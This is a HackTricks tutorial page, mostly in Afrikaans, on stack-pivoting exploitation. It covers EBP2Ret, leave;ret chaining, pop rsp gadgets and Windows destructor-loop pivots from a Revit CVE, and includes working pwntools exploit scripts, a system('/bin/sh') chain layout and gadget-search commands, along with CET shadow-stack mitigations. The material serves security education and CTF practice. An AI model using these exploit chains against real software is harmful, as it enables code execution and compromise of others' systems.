# Stack Pivoting - EBP2Ret - EBP chaining

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

Hierdie tegniek misbruik die vermoë om die **Base Pointer (EBP/RBP)** te manipuleer en sodoende die uitvoering van verskeie funksies deur middel van die frame pointer en die **`leave; ret`** instruksievolgorde aan mekaar te koppel.

Ter herinnering: op x86/x86-64 is **`leave`** ekwivalent aan:
```
mov       rsp, rbp   ; mov esp, ebp on x86
pop       rbp        ; pop ebp on x86
ret
```
En aangesien die gestoorde **EBP/RBP op die stack** vóór die gestoorde EIP/RIP is, is dit moontlik om dit te beheer deur die stack te beheer.

> Notas
> - Op 64-bit vervang EBP→RBP en ESP→RSP. Semantiek is dieselfde.
> - Sommige compilers laat die frame pointer weg (sien “EBP might not be used”). In daardie geval mag `leave` nie verskyn nie en hierdie tegniek sal nie werk nie.

### EBP2Ret

Hierdie tegniek is besonder nuttig wanneer jy die gestoorde **EBP/RBP kan verander maar geen direkte manier het om EIP/RIP te verander** nie. Dit benut die funksie-epiloog se gedrag.

Indien jy tydens die uitvoering van `fvuln` daarin slaag om 'n **fake EBP** in die stack te inject wat wys na 'n area in geheue waar jou shellcode/ROP chain address geleë is (plus 8 bytes on amd64 / 4 bytes on x86 to account for the `pop`), kan jy indirek RIP beheer. As die funksie terugkeer, stel `leave` RSP na die gekapteerde ligging en die daaropvolgende `pop rbp` verlaag RSP, wat **effektief daarvoor sorg dat dit na 'n adres wat deur die aanvaller daar gestoor is, wys**. Dan sal `ret` daardie adres gebruik.

Neem kennis dat jy **2 adresse moet ken**: die adres waarheen ESP/RSP gaan beweeg, en die waarde wat by daardie adres gestoor is en wat `ret` sal verbruik.

#### Exploit Construction

Eers moet jy 'n **adres weet waar jy arbitrêre data/adresse kan skryf**. RSP sal hierheen wys en die eerste `ret` **verbruik**.

Dan moet jy die adres kies wat deur `ret` gebruik word wat die uitvoering **sal oordra**. Jy kan gebruik:

- 'n geldige [**ONE_GADGET**](https://github.com/david942j/one_gadget) address.
- Die adres van **`system()`** gevolg deur die toepaslike return en argumente (op x86: `ret` target = `&system`, then 4 junk bytes, then `&"/bin/sh"`).
- Die adres van 'n **`jmp esp;`** gadget ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) gevolg deur inline shellcode.
- 'n [**ROP**](../rop-return-oriented-programing/index.html) ketting wat in skryfbare geheue geplaas is.

Onthou dat voor enige van hierdie adresse in die beheerarea daar ruimte moet wees vir die **`pop ebp/rbp`** van `leave` (8B on amd64, 4B on x86). Jy kan hierdie bytes misbruik om 'n **tweede fake EBP** te stel en beheer te behou nadat die eerste oproep terugkeer.

#### Off-By-One Exploit

Daar is 'n variant wat gebruik word wanneer jy **slegs die minst betekenisvolle byte van die gestoorde EBP/RBP** kan verander. In so 'n geval moet die geheue-ligging wat die adres stoor waarheen met **`ret`** gespring word, die eerste drie/vyf bytes met die oorspronklike EBP/RBP deel sodat 'n 1-byte oorskryf dit kan herlei. Gewoonlik word die lae byte (offset 0x00) verhoog om soveel as moontlik binne 'n nabygeleë bladsy/uitgelijnde streek te spring.

Dit is ook algemeen om 'n RET sled in die stack te gebruik en die werklike ROP ketting aan die einde te plaas om dit meer waarskynlik te maak dat die nuwe RSP binne die sled wys en die finale ROP ketting uitgevoer word.

### EBP Chaining

Deur 'n beheerbare adres in die gestoorde `EBP` slot van die stack te plaas en 'n `leave; ret` gadget in `EIP/RIP`, is dit moontlik om `ESP/RSP` na 'n aanvaller-beheerde adres te **skuif**.

Nou is `RSP` beheer en die volgende instruksie is `ret`. Plaas in die beheerbare geheue iets soos:

- `&(next fake EBP)` -> Gelaai deur `pop ebp/rbp` van `leave`.
- `&system()` -> Aangeroep deur `ret`.
- `&(leave;ret)` -> Nadat `system` eindig, skuif RSP na die volgende fake EBP en gaan voort.
- `&("/bin/sh")` -> Argument vir `system`.

Op hierdie manier is dit moontlik om verskeie fake EBPs aaneenskakel om die uitvoering van die program te beheer.

Dit is soos 'n [ret2lib](../rop-return-oriented-programing/ret2lib/index.html), maar meer kompleks en slegs nuttig in randgevalle.

Boonop het jy hier 'n [**voorbeeld van 'n uitdaging**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) wat hierdie tegniek saam met 'n **stack leak** gebruik om 'n wen-funksie aan te roep. Dit is die finale payload van die bladsy:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of another fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (reach saved RBP)

payload += flat(
buffer,         # Load leaked address in RBP
LEAVE_RET       # Use leave to move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
> amd64 alignment tip: System V ABI vereis 16-byte stapelbelyning by call sites. As jou ketting funksies soos `system` aanroep, voeg 'n belyningsgadget by (bv., `ret`, of `sub rsp, 8 ; ret`) voor die oproep om belyning te behou en `movaps`-krasies te vermy.

## EBP mag dalk nie gebruik word nie

As [**explained in this post**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), as 'n binary saamgestel is met sekere optimizations of met frame-pointer omission, beheer die **EBP/RBP nooit die ESP/RSP** nie. Daarom sal enige exploit wat deur beheer van EBP/RBP werk misluk omdat die prologue/epilogue nie van die frame pointer herstel nie.

- Nie geoptimaliseer / frame-pointer gebruik:
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
- Geoptimaliseer / raamwyser weggelaat:
```bash
push   %ebx         # save callee-saved register
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore
ret                 # return
```
Op amd64 sal jy dikwels `pop rbp ; ret` sien in plaas van `leave ; ret`, maar as die frame pointer heeltemal weggelaat word, is daar geen `rbp`-gebaseerde epiloog waardeur jy kan pivot nie.

## Ander maniere om RSP te beheer

### `pop rsp` gadget

[**Op hierdie bladsy**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) kan jy 'n voorbeeld vind wat hierdie tegniek gebruik. Vir daardie uitdaging moes 'n funksie met 2 spesifieke argumente aangeroep word, en daar was 'n **`pop rsp` gadget** en daar is 'n **leak van die stack**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg <reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

Kyk na die ret2esp-tegniek hier:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

### Vind pivot gadgets vinnig

Gebruik jou gunsteling gadget finder om klassieke pivot primitives te soek:

- `leave ; ret` op funksies of in biblioteke
- `pop rsp` / `xchg rax, rsp ; ret`
- `add rsp, <imm> ; ret` (of `add esp, <imm> ; ret` op x86)

Voorbeelde:
```bash
# Ropper
ropper --file ./vuln --search "leave; ret"
ropper --file ./vuln --search "pop rsp"
ropper --file ./vuln --search "xchg rax, rsp ; ret"

# ROPgadget
ROPgadget --binary ./vuln --only "leave|xchg|pop rsp|add rsp"
```
### Klassieke pivot staging-patroon

ʼn Robuuste pivot-strategie wat in baie CTFs/exploits gebruik word:

1) Gebruik 'n klein aanvanklike overflow om `read`/`recv` in 'n groot skryfbare streek (e.g., `.bss`, heap, or mapped RW memory) te roep en plaas 'n volledige ROP chain daar.
2) Keer terug na 'n pivot gadget (`leave ; ret`, `pop rsp`, `xchg rax, rsp ; ret`) om RSP na daardie streek te skuif.
3) Gaan voort met die staged chain (e.g., leak libc, call `mprotect`, then `read` shellcode, then jump to it).

### Windows: Destructor-loop weird-machine pivots (Revit RFA gevallestudie)

Client-side parsers implementeer soms destructor loops wat indirek 'n function pointer aanroep wat afkomstig is van attacker-controlled object fields. As elke iterasie presies een indirecte oproep bied (ʼn “one-gadget” machine), kan jy dit omskakel na 'n betroubare stack pivot en ROP entry.

Waargenome in Autodesk Revit RFA deserialisering (CVE-2025-5037):

- Gemaakte objects van tipe `AString` plaas 'n pointer na attacker bytes by offset 0.
- Die destructor loop voer effektief een gadget per object uit:
```asm
rcx = [rbx]              ; object pointer (AString*)
rax = [rcx]              ; pointer to controlled buffer
call qword ptr [rax]     ; execute [rax] once per object
```
Twee praktiese pivots:

- Windows 10 (32-bit heap addrs): verkeerd uitgelijnde “monster gadget” wat `8B E0` bevat → `mov esp, eax`, uiteindelik `ret`, om te pivot vanaf die call primitive na 'n heap-based ROP chain.
- Windows 11 (full 64-bit addrs): gebruik twee objects om 'n constrained weird-machine pivot aan te dryf:
- Gadget 1: `push rax ; pop rbp ; ret` (skuif die oorspronklike rax na rbp)
- Gadget 2: `leave ; ... ; ret` (word `mov rsp, rbp ; pop rbp ; ret`), wat pivoting in die eerste object’s buffer veroorsaak, waar 'n conventional ROP chain volg.

Wenke vir Windows x64 na die pivot:

- Hou rekening met die 0x20-byte shadow space en handhaaf 16-byte uitlyn voor `call` sites. Dit is dikwels handig om literals bo die return address te plaas en 'n gadget soos `lea rcx, [rsp+0x20] ; call rax` te gebruik, gevolg deur `pop rax ; ret` om stack-adresse deur te gee sonder om control flow te bederf.
- Non-ASLR helper modules (indien teenwoordig) verskaf stabiele gadget pools en imports soos `LoadLibraryW`/`GetProcAddress` om dinamies te resolve teikens soos `ucrtbase!system`.
- Skep van ontbrekende gadgets via 'n writable thunk: as 'n belowende reeks eindig in 'n `call` deur 'n writable function pointer (bv. DLL import thunk of function pointer in .data), oor skryf daardie pointer met 'n benign single-step soos `pop rax ; ret`. Die reeks gedra dan asof dit geëindig het met `ret` (bv. `mov rdx, rsi ; mov rcx, rdi ; ret`), wat van onskatbare waarde is om Windows x64 arg registers te laai sonder om ander te klobber.

Vir volledige kettingkonstruksie en gadget-voorbeelde, sien die verwysing hieronder.

## Moderne mitigasies wat stack pivoting breek (CET/Shadow Stack)

Moderne x86 CPUs en OS's maak toenemend gebruik van **CET Shadow Stack (SHSTK)**. Met SHSTK aangeskakel, vergelyk `ret` die return address op die normale stack met 'n hardware-beskermde shadow stack; enige afwyking veroorsaak 'n Control-Protection fout en beëindig die proses. Daarom sal tegnieke soos EBP2Ret/leave;ret-gebaseerde pivots crash sodra die eerste `ret` vanaf 'n gepivoteerde stack uitgevoer word.

- For background and deeper details see:


{{#ref}}
../common-binary-protections-and-bypasses/cet-and-shadow-stack.md
{{#endref}}

- Vinnige kontroles op Linux:
```bash
# 1) Is the binary/toolchain CET-marked?
readelf -n ./binary | grep -E 'x86.*(SHSTK|IBT)'

# 2) Is the CPU/kernel capable?
grep -E 'user_shstk|ibt' /proc/cpuinfo

# 3) Is SHSTK active for this process?
grep -E 'x86_Thread_features' /proc/$$/status   # expect: shstk (and possibly wrss)

# 4) In pwndbg (gdb), checksec shows SHSTK/IBT flags
(gdb) checksec
```
- Notes for labs/CTF:
- Sommige moderne distros skakel SHSTK in vir CET-enabled binaries wanneer hardeware en glibc ondersteuning teenwoordig is. Vir beheerde toetsing in VMs kan SHSTK stelselwyd gedeaktiveer word via die kernel boot-parameter `nousershstk`, of selektief geaktiveer word via glibc tunables tydens opstart (sien referensies). Moet nie mitigasies op produksie teikens deaktiveer nie.
- JOP/COOP of SROP-gebaseerde tegnieke kan dalk steeds op sekere teikens werk, maar SHSTK breek spesifiek `ret`-gebaseerde pivots.

- Windows nota: Windows 10+ blootstel user-mode en Windows 11 voeg kernel-mode “Hardware-enforced Stack Protection” gebou op shadow stacks by. CET-compatible processes voorkom stack pivoting/ROP by `ret`; ontwikkelaars kies in via CETCOMPAT en verwante beleid (sien referensie).

## ARM64

In ARM64, die **prologue and epilogues** van die funksies **stoor en haal nie die SP register in die stack op nie**. Verder keer die **`RET`** instruksie nie terug na die adres waarop SP wys nie, maar **na die adres binne `x30`**.

Therefore, by default, just abusing the epilogue you **won't be able to control the SP register** by overwriting some data inside the stack. And even if you manage to control the SP you would still need a way to **control the `x30`** register.

- prologue

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP points to frame record
```

- epilogue

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

> [!CAUTION]
> Die manier om iets soortgelyks aan stack pivoting in ARM64 uit te voer sou wees om die vermoë te hê om die **`SP`** te beheer (deur 'n register te beheer waarvan die waarde aan `SP` oorgedra word of omdat SP om een of ander rede sy adres vanaf die stack neem en ons 'n overflow het) en dan **die epilogue te misbruik** om die **`x30`** register van 'n **gekontroleerde `SP`** te laai en daarna te **`RET`**.

Ook op die volgende bladsy kan jy die ekwivalent van **Ret2esp in ARM64** sien:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

## References

- [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
- [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
- [https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html)
- 64-bit, off by one uitbuiting met 'n rop chain wat begin met 'n ret sled
- [https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html](https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html)
- 64-bit, geen relro, canary, nx en pie nie. Die program gee 'n leak vir stack of pie en 'n WWW van 'n qword. Kry eers die stack leak en gebruik die WWW om terug te gaan en die pie leak te kry. Gebruik dan die WWW om 'n ewige lus te skep deur `.fini_array` entries te misbruik + deur `__libc_csu_fini` aan te roep ([more info here](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini_array.md)). Deur hierdie "ewige" write te misbruik, word 'n ROP chain in die .bss geskryf en eindig dit deur dit aan te roep deur te pivot met RBP.
- Linux kernel documentation: Control-flow Enforcement Technology (CET) Shadow Stack — besonderhede oor SHSTK, `nousershstk`, `/proc/$PID/status` flags, en die aktivering via `arch_prctl`. https://www.kernel.org/doc/html/next/x86/shstk.html
- Microsoft Learn: Kernel Mode Hardware-enforced Stack Protection (CET shadow stacks on Windows). https://learn.microsoft.com/en-us/windows-server/security/kernel-mode-hardware-stack-protection
- [Crafting a Full Exploit RCE from a Crash in Autodesk Revit RFA File Parsing (ZDI blog)](https://www.thezdi.com/blog/2025/10/6/crafting-a-full-exploit-rce-from-a-crash-in-autodesk-revit-rfa-file-parsing)

{{#include ../../banners/hacktricks-training.md}}
